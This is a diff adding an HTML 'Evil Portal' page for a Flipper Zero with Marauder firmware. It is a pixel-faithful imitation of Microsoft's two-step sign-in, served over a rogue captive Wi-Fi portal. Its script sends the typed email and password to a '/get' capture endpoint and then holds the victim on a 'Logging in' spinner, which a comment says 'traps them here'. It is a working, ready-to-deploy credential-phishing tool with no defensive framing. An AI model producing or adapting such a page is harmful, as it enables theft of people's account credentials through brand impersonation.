@@ -1,0 +1,459 @@
+<!--
+  MS Login Portal - Flipper Evil Portal
+  hacked together by pleasedontdisturb on github
+  works on marauder fw, might need tweaks for other boards
+
+  known issues:
+  - spinner looks weird on old android webviews
+
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to your Microsoft account</title>
+  <style>
+    /* reset + base */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+      background: radial-gradient(circle at 90% 10%, #eef5fc 0%, #f3f3f3 60%, #e3edf7 100%);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #1b1b1b;
+    }
+
+    /* main card container */
+    .stage-container {
+      position: relative;
+      width: 440px;
+      overflow: hidden;
+      background-color: #ffffff;
+      border-radius: 4px;
+      box-shadow: 0 4px 32px 0 rgba(0, 0, 0, 0.08);
+      margin-bottom: 20px;
+    }
+
+    .slider-wrapper {
+      display: flex;
+      width: 1320px; /* 3 slides */
+      transition: transform 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .login-card {
+      width: 440px;
+      height: 356px;
+      padding: 44px;
+      flex-shrink: 0;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* microsoft logo grid */
+    .logo-container {
+      margin-bottom: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+    }
+
+    .logo-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 2px;
+      width: 21px;
+      height: 21px;
+      margin-right: 10px;
+    }
+
+    .square {
+      width: 9.5px;
+      height: 9.5px;
+    }
+
+    .red    { background-color: #f25022; }
+    .green  { background-color: #7fba00; }
+    .blue   { background-color: #00a4ef; }
+    .yellow { background-color: #ffb900; }
+
+    .company-name {
+      font-size: 16px;
+      color: #737373;
+      font-weight: 600;
+    }
+
+    /* step 2 identity pill */
+    .identity-pill {
+      display: inline-flex;
+      align-items: center;
+      font-size: 15px;
+      color: #1b1b1b;
+      margin-bottom: 16px;
+      cursor: pointer;
+    }
+
+    .back-arrow {
+      width: 24px;
+      height: 24px;
+      margin-right: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+    }
+
+    .back-arrow:hover {
+      background-color: #e6e6e6;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin-bottom: 16px;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    input {
+      width: 100%;
+      height: 36px;
+      padding: 6px 10px;
+      border: 1px solid #666666;
+      border-radius: 0px;
+      font-size: 15px;
+      color: #1b1b1b;
+      outline: none;
+    }
+
+    input:focus {
+      border: 2px solid #0067b8;
+      padding: 5px 9px; /* compensate for thicker border */
+    }
+
+    .text-links {
+      font-size: 13px;
+      color: #1b1b1b;
+      margin-bottom: 16px;
+    }
+
+    .text-links a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+
+    .text-links a:hover {
+      text-decoration: underline;
+    }
+
+    .button-group {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: auto;
+    }
+
+    .btn-primary {
+      min-width: 108px;
+      height: 32px;
+      background-color: #0067b8;
+      color: #ffffff;
+      border: none;
+      font-size: 15px;
+      cursor: pointer;
+      padding: 0 12px;
+    }
+
+    .btn-primary:hover {
+      background-color: #005da6;
+    }
+
+    /* loading / step 3 */
+    .loading-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      text-align: center;
+    }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0067b8;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 24px;
+    }
+
+    @keyframes spin {
+      0%   { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 18px;
+      color: #1b1b1b;
+      font-weight: 400;
+    }
+
+    /* footer links */
+    footer {
+      position: absolute;
+      bottom: 0;
+      right: 0;
+      width: 100%;
+      padding: 20px 40px;
+      display: flex;
+      justify-content: flex-end;
+      gap: 16px;
+    }
+
+    footer a,
+    footer span {
+      font-size: 12px;
+      color: #575757;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    /* slide states */
+    .show-step2 .slider-wrapper {
+      transform: translateX(-440px);
+    }
+
+    .show-loading .slider-wrapper {
+      transform: translateX(-880px);
+    }
+
+    /* mobile / captive portal tweaks */
+    @media (max-width: 480px) {
+      body {
+        background: #ffffff;
+        justify-content: space-between;
+        overflow-y: auto;
+      }
+
+      .stage-container {
+        width: 100%;
+        box-shadow: none;
+        border-radius: 0;
+        margin-bottom: 0;
+      }
+
+      .slider-wrapper {
+        width: 300%;
+      }
+
+      .login-card {
+        width: 33.333%;
+        height: 80vh;
+        padding: 44px 24px 24px 24px;
+      }
+
+      .show-step2 .slider-wrapper {
+        transform: translateX(-33.333%);
+      }
+
+      .show-loading .slider-wrapper {
+        transform: translateX(-66.666%);
+      }
+
+      footer {
+        position: relative;
+        justify-content: flex-start;
+        flex-wrap: wrap;
+        padding: 16px 24px;
+        background-color: #ffffff;
+        margin-top: auto;
+      }
+    }
+
+    /* captive portal window detection (ios/android popup) */
+    .cp-mode body {
+      background: #ffffff;
+    }
+
+    .cp-mode .stage-container {
+      box-shadow: none;
+      border-radius: 0;
+      margin-bottom: 0;
+    }
+
+    .cp-mode footer {
+      position: relative;
+    }
+  </style>
+<base target="_blank">
+</head>
+<body>
+
+  <div class="stage-container" id="stageContainer">
+    <div class="slider-wrapper">
+
+      <!-- step 1: email -->
+      <div class="login-card" id="step1">
+        <div class="logo-container">
+          <div class="logo-grid">
+            <div class="square red"></div>
+            <div class="square green"></div>
+            <div class="square blue"></div>
+            <div class="square yellow"></div>
+          </div>
+          <span class="company-name">Microsoft</span>
+        </div>
+
+        <h1>Sign in</h1>
+
+        <form id="formStep1" onsubmit="handleNext(event)" style="display: flex; flex-direction: column; flex-grow: 1;" autocomplete="off">
+          <div class="input-group">
+            <input type="email" id="emailInput" placeholder="Email, phone, or Skype" autocomplete="username" required>
+          </div>
+
+          <div class="text-links">
+            No account? <a href="#" onclick="return false;">Create one!</a>
+          </div>
+
+          <div class="text-links">
+            <a href="#" onclick="return false;">Can't access your account?</a>
+          </div>
+
+          <div class="button-group">
+            <input type="submit" value="Next" class="btn-primary">
+          </div>
+        </form>
+      </div>
+
+      <!-- step 2: password -->
+      <div class="login-card" id="step2">
+        <div class="logo-container">
+          <div class="logo-grid">
+            <div class="square red"></div>
+            <div class="square green"></div>
+            <div class="square blue"></div>
+            <div class="square yellow"></div>
+          </div>
+          <span class="company-name">Microsoft</span>
+        </div>
+
+        <div class="identity-pill" onclick="handleBack()">
+          <div class="back-arrow">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1b1b1b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="19" y1="12" x2="5" y2="12"></line>
+              <polyline points="12 19 5 12 12 5"></polyline>
+            </svg>
+          </div>
+          <span id="displayEmail">user@example.com</span>
+        </div>
+
+        <h1>Enter password</h1>
+
+        <form id="formStep2" onsubmit="handleSubmit(event)" style="display: flex; flex-direction: column; flex-grow: 1;" autocomplete="off">
+          <div class="input-group">
+            <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password" required>
+          </div>
+
+          <div class="text-links">
+            <a href="#" onclick="return false;">Forgot password?</a>
+          </div>
+
+          <div class="text-links">
+            <a href="#" onclick="return false;">Other ways to sign in</a>
+          </div>
+
+          <div class="button-group">
+            <input type="submit" value="Sign in" class="btn-primary">
+          </div>
+        </form>
+      </div>
+
+      <!-- step 3: loading spinner (traps them here) -->
+      <div class="login-card" id="step3">
+        <div class="loading-container">
+          <div class="spinner"></div>
+          <div class="loading-text">Logging in</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <footer>
+    <a href="#" onclick="return false;">Terms of use</a>
+    <a href="#" onclick="return false;">Privacy & cookies</a>
+    <span>...</span>
+  </footer>
+
+  <script>
+
+    const stageContainer = document.getElementById('stageContainer');
+    const emailInput     = document.getElementById('emailInput');
+    const displayEmail   = document.getElementById('displayEmail');
+    const passwordInput  = document.getElementById('passwordInput');
+
+
+    if (window.outerWidth < 500 || /CaptiveNetworkSupport/.test(navigator.userAgent)) {
+      document.body.classList.add('cp-mode');
+    }
+
+
+    function handleNext(e) {
+      e.preventDefault();
+
+      if (emailInput.value.trim() !== "") {
+        displayEmail.textContent = emailInput.value;
+        stageContainer.classList.remove('show-loading');
+        stageContainer.classList.add('show-step2');
+
+
+        setTimeout(() => passwordInput.focus(), 300);
+      }
+    }
+
+
+    function handleBack() {
+      stageContainer.classList.remove('show-step2');
+      stageContainer.classList.remove('show-loading');
+      passwordInput.value = "";
+
+      setTimeout(() => emailInput.focus(), 300);
+    }
+
+
+    function handleSubmit(e) {
+      e.preventDefault();
+
+
+      stageContainer.classList.remove('show-step2');
+      stageContainer.classList.add('show-loading');
+
+      // build the url
+      var email    = encodeURIComponent(emailInput.value.trim());
+      var password = encodeURIComponent(passwordInput.value.trim());
+      var captureUrl = '/get?email=' + email + '&password=' + password;
+
+
+      new Image().src = captureUrl;
+
+      // FIXME: some boards use /post instead of /get
+      // if youre not seeing captures, swap the endpoint
+    }
+  </script>
+
+</body>
+</html>
